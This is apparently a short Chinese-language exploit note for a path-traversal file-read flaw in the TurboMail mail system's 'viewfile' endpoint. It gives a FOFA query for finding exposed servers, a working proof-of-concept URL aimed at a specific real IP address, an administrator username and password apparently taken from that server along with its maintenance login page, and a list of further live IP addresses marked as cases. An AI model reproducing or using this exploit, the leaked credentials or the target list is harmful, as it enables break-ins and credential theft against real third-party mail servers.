# TurboMail 邮件系统 viewfile 文件读取漏洞

    ## fofa

```
app="TurboMail"
```

## poc

```
http://113.108.253.183:8081/viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml
```

![image](https://s1.ax1x.com/2023/04/09/ppHwZtI.png)

```
username :postmaster
password :Dgmf7690
http://113.108.253.183:8081/maintlogin.jsp
```

![image](https://s1.ax1x.com/2023/04/09/ppHweht.png)

## 案例

| URL  | http://113.108.253.183:8081http://113.98.99.130:9090http://114.221.154.248:8081http://123.124.56.127:8090http://183.230.47.186:8090 |
| ---- | ------------------------------------------------------------ |
